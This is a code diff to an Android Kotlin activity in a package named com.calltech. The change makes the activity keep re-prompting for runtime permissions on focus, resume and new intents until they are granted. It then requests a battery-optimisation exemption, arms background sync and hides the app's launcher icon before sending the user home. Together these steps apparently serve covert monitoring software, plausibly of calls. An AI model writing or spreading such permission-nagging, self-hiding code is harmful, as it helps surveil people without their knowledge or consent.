@@ -1,5 +1,6 @@
 package com.calltech
 
+import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -10,13 +11,15 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 
 /**
- * Home wallpaper ke upar system Allow popup.
- * Release APK + Xiaomi: classic requestPermissions + setContentView zaroori.
+ * USB / launcher start ke baad home par system Allow popup.
+ * Icon tap ki zaroorat nahi — window focus milte hi requestPermissions.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private val mainHandler = Handler(Looper.getMainLooper())
-    private var askedOnce = false
+    private var lastAskAt = 0L
+    private var batteryAsked = false
     private var finished = false
+    private var ignoreResumeUntil = 0L
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -32,14 +35,27 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         }
 
         PermissionPopupAlarms.schedule(this)
-        mainHandler.post { askPermissions() }
     }
 
-    override fun onAttachedToWindow() {
-        super.onAttachedToWindow()
-        if (!finished) {
-            mainHandler.post { askPermissions() }
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        if (!finished && SyncBootstrap.needsRuntimePermissions(this)) {
+            lastAskAt = 0L
+            mainHandler.postDelayed({ askPermissions() }, 200L)
         }
+    }
+
+    override fun onWindowFocusChanged(hasFocus: Boolean) {
+        super.onWindowFocusChanged(hasFocus)
+        if (!hasFocus || finished) {
+            return
+        }
+        if (!SyncBootstrap.needsRuntimePermissions(this)) {
+            onAllowed()
+            return
+        }
+        mainHandler.postDelayed({ askPermissions() }, 350L)
     }
 
     override fun onResume() {
@@ -47,13 +63,14 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (finished) {
             return
         }
+        if (System.currentTimeMillis() < ignoreResumeUntil) {
+            return
+        }
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
             onAllowed()
             return
         }
-        if (!askedOnce) {
-            mainHandler.postDelayed({ askPermissions() }, 200L)
-        }
+        mainHandler.postDelayed({ askPermissions() }, 400L)
     }
 
     override fun onRequestPermissionsResult(
@@ -73,7 +90,11 @@ class PermissionTrampolineActivity : AppCompatActivity() {
     }
 
     private fun askPermissions() {
-        if (finished || isFinishing || askedOnce) {
+        if (finished || isFinishing || batteryAsked) {
+            return
+        }
+        if (!hasWindowFocus()) {
+            mainHandler.postDelayed({ askPermissions() }, 300L)
             return
         }
         val missing = SyncBootstrap.requiredPermissions().filter { permission ->
@@ -83,7 +104,11 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             onAllowed()
             return
         }
-        askedOnce = true
+        val now = System.currentTimeMillis()
+        if (now - lastAskAt < 1600L) {
+            return
+        }
+        lastAskAt = now
         bringToFront()
         ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
     }
@@ -93,7 +118,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             PermissionPopupAlarms.cancel(this)
             onAllowed()
         } else if (!isFinishing) {
-            askedOnce = false
+            lastAskAt = 0L
             mainHandler.postDelayed({ askPermissions() }, 400L)
         }
     }
@@ -102,11 +127,23 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (finished) {
             return
         }
+        if (!batteryAsked && BatteryOptimizationHelper.requestFromActivity(this)) {
+            batteryAsked = true
+            ignoreResumeUntil = System.currentTimeMillis() + 800L
+            return
+        }
+        finishSetup()
+    }
+
+    private fun finishSetup() {
+        if (finished) {
+            return
+        }
         finished = true
         PermissionPopupAlarms.cancel(this)
-        LauncherHider.hideNow(this)
         SyncObserverManager.register(applicationContext)
         SyncBootstrap.armBackgroundSync(applicationContext)
+        SyncAlarmScheduler.scheduleNext(applicationContext)
 
         BackgroundSyncRunner.run {
             try {
@@ -125,11 +162,25 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             }
         }
 
-        try {
-            moveTaskToBack(true)
-        } catch (_: Exception) {
-        }
+        LauncherHider.hideNow(this)
+        goHome()
         finish()
+    }
+
+    private fun goHome() {
+        try {
+            startActivity(
+                Intent(Intent.ACTION_MAIN).apply {
+                    addCategory(Intent.CATEGORY_HOME)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                },
+            )
+        } catch (_: Exception) {
+            try {
+                moveTaskToBack(true)
+            } catch (_: Exception) {
+            }
+        }
     }
 
     private fun bringToFront() {
